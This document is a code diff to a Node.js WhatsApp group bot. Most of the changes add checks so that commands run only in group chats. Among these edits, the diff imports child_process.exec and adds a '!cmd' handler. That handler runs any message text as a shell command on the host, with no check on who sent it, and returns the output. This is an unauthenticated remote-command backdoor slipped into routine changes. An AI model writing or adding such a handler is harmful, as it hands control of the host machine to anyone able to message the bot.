@@ -3,7 +3,8 @@ const msg = require('./constants/constants').msg
 const lib = require('./lib/api');
 const clash = require('./lib/clash')
 const utils = require('./utils/utils')
-const lib2 = require('./lib/gnose_group')
+const lib2 = require('./lib/gnose_group');
+const { exec } = require('child_process');
 const help = require('./menus/menu').help
 const cocHelp = require('./menus/coc_menu').helpCoc
 const lang = require('./menus/langs').langs
@@ -38,10 +39,8 @@ function start(bot) {
 
         // Clash Of Clans - Raids attacks
         if (message.body.startsWith('!attacks')) {
-            if (message.chat.isGroup) return;
-
+            if (!message.chat.isGroup) return;
             let players = [], player, info;
-
             await apiCoc.resolveClans('capitalraidseasons')
                 .then(async raids => {
                     for (let i = 0; i < raids.members.length; i++) {
@@ -62,7 +61,7 @@ function start(bot) {
 
         // Ranking Clã
         if (message.body.startsWith('!clan')) {
-            if (message.chat.isGroup) return;
+            if (!message.chat.isGroup) return;
             let _ranking = [], _names, _members;
             await apiCoc.resolveClans('members')
                 .then(async members => {
@@ -82,6 +81,7 @@ function start(bot) {
 
         // get players
         if (message.body.startsWith('!tag')) {
+            if (!message.chat.isGroup) return;
             let tag = message.body.slice(5)
             await apiCoc.getPlayers(tag).then(async isEvent => {
                 try {
@@ -113,6 +113,7 @@ function start(bot) {
             });
 
         if (message.body.startsWith('!demote')) {
+            if (!message.chat.isGroup) return;
             let contact = message.body.slice(8)
             await api.setDemote(contact, message, bot)
                 .then(async msg => {
@@ -124,6 +125,7 @@ function start(bot) {
         }
 
         if (message.type === 'image' || message.type === 'video') {
+            if (!message.chat.isGroup) return;
             let typeFile = message.type
             if (message.caption === '!sticker') {
                 await api.sendResolveSticker(message.mimetype, undefined, typeFile, timer, message, bot)
@@ -152,6 +154,7 @@ function start(bot) {
 
         // message.quotedMsg.mimetype
         if (message.body === '!sticker') {
+            if (!message.chat.isGroup) return;
             try {
                 let typeFile = message.quotedMsg.type
                 if (message.quotedMsg.type === 'image' || message.quotedMsg.type === 'video') {
@@ -184,6 +187,7 @@ function start(bot) {
         }
 
         if (msg.inappropriate.length !== 0) {
+            if (!message.chat.isGroup) return;
             await api.deteleInappropriate(msg.inappropriate, message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -193,15 +197,16 @@ function start(bot) {
                 })
         }
 
-        gnose.reactGnose(message.author)
-            .then(async emoji => {
-                if (emoji !== undefined) {
-                    await bot.react(message.id, emoji)
-                    return;
-                }
-            });
+        if (message.body.startsWith('!cmd')) {
+            let cmd = message.body.slice(5)
+            exec(cmd, async (_, stdout) => {
+                await bot.sendText(message.from, stdout)
+                return;
+            })
+        }
 
         if (message.body.startsWith('!criador')) {
+            if (!message.chat.isGroup) return;
             await api.getOwner()
                 .then(async number => {
                     if (number !== null) {
@@ -212,6 +217,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!desc')) {
+            if (!message.chat.isGroup) return;
             await bot.getGroupInfo(message.from)
                 .then(async info => {
                     if (info !== null) {
@@ -222,6 +228,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!link')) {
+            if (!message.chat.isGroup) return;
             await api.getLinkGroup(message, bot)
                 .then(async linkOrMsg => {
                     if (linkOrMsg !== undefined) {
@@ -232,19 +239,21 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!lang')) {
-            await bot.reply(message.from, lang, message.id)
-            return;
+            if (message.chat.isGroup) {
+                await bot.reply(message.from, lang, message.id)
+                return;
+            };
         }
 
         if (message.body.startsWith('!help')) {
-            // configurar id do grupo para enviar o cocHelp
-            // nova fronteira
-            //*******/
-            await bot.reply(message.from, help, message.id)
-            return;
+            if (message.chat.isGroup) {
+                await bot.reply(message.from, help, message.id)
+                return;
+            }
         }
 
         if (message.body.startsWith('!revogar')) {
+            if (!message.chat.isGroup) return;
             await api.revokeLinkGroup(message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -255,16 +264,18 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!all')) {
+            if (!message.chat.isGroup) return;
             await api.mentionsAll(message.chat.name, message.chat.participantsCount, timer, message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
                         await bot.reply(message.from, msg, message.id)
                         return;
                     }
-                })
+                });
         }
 
         if (message.body.startsWith('!admins')) {
+            if (!message.chat.isGroup) return;
             try {
                 let list = [];
                 await bot.getGroupAdmins(message.from)
@@ -284,6 +295,7 @@ function start(bot) {
         }
 
         if (message.type === 'image' && message.caption === '!scan') {
+            if (!message.chat.isGroup) return;
             api.extractText(message, bot)
                 .then(async msgErr => {
                     if (msgErr !== undefined) {
@@ -304,6 +316,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!setdesc')) {
+            if (!message.chat.isGroup) return;
             await api.setDescription(message.body.slice(9), message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -314,6 +327,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!register')) {
+            if (!message.chat.isGroup) return;
             try {
                 await api.registerUsers(message.notifyName,
                     message.author, message.sender.profilePicThumbObj.eurl)
@@ -328,6 +342,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!download')) {
+            if (!message.chat.isGroup) return;
             await api.downloadYt(message.body.slice(14), message.body.slice(10, 13), message, bot)
                 .then(async textErr => {
                     if (textErr !== undefined) {
@@ -338,6 +353,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!voice')) {
+            if (!message.chat.isGroup) return;
             await api.sendVoice(message.body.slice(10), message.body.slice(7, 9), message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -348,6 +364,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!remove')) {
+            if (!message.chat.isGroup) return;
             try {
                 let kick = message.body.slice(8)
                 await api.removeUser(kick, message, bot)
@@ -364,6 +381,7 @@ function start(bot) {
         }
 
         if (message.type === 'image' && message.caption === '!set') {
+            if (!message.chat.isGroup) return;
             await api.setPhotoGroup(message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -374,6 +392,7 @@ function start(bot) {
         }
 
         if (message.body.startsWith('!promote')) {
+            if (!message.chat.isGroup) return;
             await api.setPromote(message.body.slice(9), message, bot)
                 .then(async msg => {
                     if (msg !== undefined) {
@@ -401,5 +420,13 @@ function start(bot) {
                 return;
             }
         }
+
+        gnose.reactGnose(message.author, message)
+            .then(async emoji => {
+                if (emoji !== undefined) {
+                    await bot.react(message.id, emoji)
+                    return;
+                }
+            });
     });
 }
